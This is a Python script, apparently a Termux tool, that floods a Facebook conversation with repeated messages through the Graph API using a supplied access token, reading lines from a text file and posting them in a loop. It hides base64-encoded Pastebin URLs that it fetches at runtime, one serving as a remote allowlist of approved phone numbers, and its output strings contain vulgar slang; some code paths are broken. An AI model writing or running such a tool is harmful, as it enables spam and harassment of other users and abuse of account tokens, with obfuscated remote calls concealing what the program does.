from platform import system
import sys
def testPY():
    if(sys.version_info[0] < 3):
        print ('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
        sys.exit()


def modelsInstaller():
	try :
		models = ['requests', 'colorama']
		for model in models:
			try:
				if(sys.version_info[0] < 3):
					os.system('cd C:\Python27\Scripts & pip install {}'.format(model))
				else :
					os.system('python -m pip install {}'.format(model))
				print (' ')
				print (' [+] {} has been installed successfully, Restart the program.'.format(model))
				sys.exit()
				print (' ')
			except:
				print (' [-] Install {} manually.'.format(model))
				print (' ')
	except:
		pass

import base64
import json
import time
import sys,os,re,binascii,time,json,random,threading,pprint,smtplib,telnetlib,os.path,hashlib,string,glob,sqlite3,urllib,argparse,marshal
from platform import system
from datetime import datetime

try :
	import requests
	from colorama import Fore
	from colorama import init
except :
	modelsInstaller()

requests.packages.urllib3.disable_warnings()

def cls():
	if system() == 'Linux':
		os.system('clear')
	else:
		if system() == 'Windows':
			os.system('cls')
cls()
CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'   # mode 31 = red forground
RESET = '\033[0m'  # mode 0  = reset
BLUE  = "\033[34m"
WHITE = "\u001b[37m",
YELLOW = "\u001b[33;1m",
CYAN  = "\033[36m"
MAGENTA = "\u001b[35m",
GREEN = "\033[32m"
RESET = "\033[0m"
BOLD = '\033[1m'
REVERSE = "\033[m"
def logo():
		clear = "\x1b[0m"
		colors = [35,33,36 ]

		x = """

 $$$$$$\  $$\                                     
$$  __$$\ $$ |                                    
$$ /  $$ |$$ | $$$$$$\  $$$$$$$\   $$$$$$\        
$$$$$$$$ |$$ |$$  __$$\ $$  __$$\ $$  __$$\       
$$  __$$ |$$ |$$ /  $$ |$$ |  $$ |$$$$$$$$ |      
$$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |$$   ____|      
$$ |  $$ |$$ |\$$$$$$  |$$ |  $$ |\$$$$$$$\       
\__|  \__|\__| \______/ \__|  \__| \_______|      
                                                                                                
$$$$$$$\            $$\                           
$$  __$$\           $$ |                          
$$ |  $$ |$$\   $$\ $$ | $$$$$$\  $$\   $$\       
$$$$$$$  |$$ |  $$ |$$ |$$  __$$\ \$$\ $$  |      
$$  __$$< $$ |  $$ |$$ |$$$$$$$$ | \$$$$  /       
$$ |  $$ |$$ |  $$ |$$ |$$   ____| $$  $$<        
$$ |  $$ |\$$$$$$  |$$ |\$$$$$$$\ $$  /\$$\       
\__|  \__| \______/ \__| \_______|\__/  \__|      
___________________________________________________________

-=[ Facebook Tool Pool Ka Super Hero By Alone Rulex ]=-
-=[ Contact Us :: https://facebook.com/groups/411040537413366/]=-
___________________________________________________________
"""
		for N, line in enumerate(x.split("\n")):
			sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
			time.sleep(0.001)
logo()
testPY()

headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
			'referer': 'www.google.com'}
			
newt = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
newtt = newt
ysd = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2hQbTZLYXh1"
yss = base64.b64decode(ysd)
yff = yss.decode('utf-8', 'ignore')
y = requests.get(yff)
z = y.text
ch=z
print(BOLD+GREEN+"[#] Start Time ==> ",newtt)
print(BOLD+GREEN+'[#] _ Alone Boiis 
==> '+ch+'\n\n')



def comment_on_posts(posts):
	for i in ns:
		try:
			message = i
			url = "https://graph.facebook.com/v14.0/{0}".format("t_"+profile_id)
			parameters = {'access_token' : access_token, 'message' : message}
			s = requests.post(url, data = parameters, headers=headers)
			tt = time.strftime("%Y-%m-%d %I:%M:%S %p")
			
			if s.ok:
				print (BOLD+GREEN+' [+] Sahii Haii .. | [+] Time :: ',datetime.now().strftime('%Y-%m-%d %I:%M:%S %p'),"\n [+] Han Chala Gaya Tera Message ==> " +message)
				time.sleep(timm)
			else:
				print(BOLD+RED+' [x] Lund Sahii Ha Mera :: [+] Loda Gaya Tera Message :: '+tt,'\n','[-] Message Error :: ==> '+message)
				time.sleep(timm)
		except Exception as e:
			print(e)
			time.sleep(timm)
							   
def get_posts(): 
	try:
		url = "https://mbasic.facebook.com"
	except HTTPError as e:
		print("HTTP Error")
	except URLError as e:
		print("URL Error")
		
qqq = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2IyU0VwV014"
www = base64.b64decode(qqq)
eee = www. decode("utf-8")
rrr = requests.get(eee)
for linee in rrr:
	mmm = linee.decode("utf-8")
	mmm = mmm.split(',')
inn = input(BOLD+CYAN+"[+] Mobile Number :: ")
if inn in mmm:
	token = input("[+] Token File :: ")
	with open(token, 'r') as f2:
		access_token = f2.read()
		payload = {'access_token' : access_token}
		a = "https://graph.facebook.com/v14.0/me"
		b = requests.get(a, params=payload)
		d = json.loads(b.text)
		if 'name' not in d:
			print(BOLD+RED+'\n[x] Token Invalid ..!!')
			sys.exit()
		f = d['name']
		prof = ("\nYour Profile Name :: " + f+'\n\n')
		for pro in prof:
			sys.stdout.write(BOLD+GREEN+pro)
			sys.stdout.flush()
			time.sleep(0.001)
		profile_id = input(BOLD+CYAN+"[+] Conservation ID :: ")
		
	
			
		
		
		ms = input(BOLD+CYAN+"[+] Add Text File :: ")
		repeat = int(input(BOLD+CYAN+"[+] File Repeat :: "))
		timm = int(input(BOLD+CYAN+"[+] Speed in Seconds :: "))
		load = ('\n'+"________All Done....Loading Profile Info.....!"+'\n')
		for loa in load:
			sys.stdout.write(BOLD+BLUE+loa)
			sys.stdout.flush()
			time.sleep(0.001)
		prof = ("[+]=> Active Profile :: " + f+'\n\n')
		for pro in prof:
			sys.stdout.write(BOLD+BLUE+pro)
			sys.stdout.flush()
			time.sleep(0.001)
		ns = open(ms, 'r').readlines()
	for i in range(repeat):
		posts = get_posts()
		comment_on_posts(posts)
else:
	print(BOLD+RED+'[-] <==> Your Number Is Wrong Please Take Approval From Owner')
